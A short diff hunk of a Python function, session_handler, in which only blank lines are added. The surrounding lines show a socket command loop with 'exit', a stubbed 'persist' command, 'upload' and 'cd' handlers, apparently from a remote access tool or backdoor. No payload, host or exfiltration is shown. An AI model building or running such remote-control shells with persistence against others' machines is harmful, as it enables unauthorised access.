@@ -64,10 +64,13 @@ def session_handler():
             if message == 'exit':
                 secure_sock.close()
                 break
+            
             elif message in ['persist', 'pt']:
                 pass
+            
             elif message[:7] == 'upload ':
                 download_file(message[7:])
+                
             elif message[:3] == 'cd ':
                 try:
                     directory = str(message[3:])
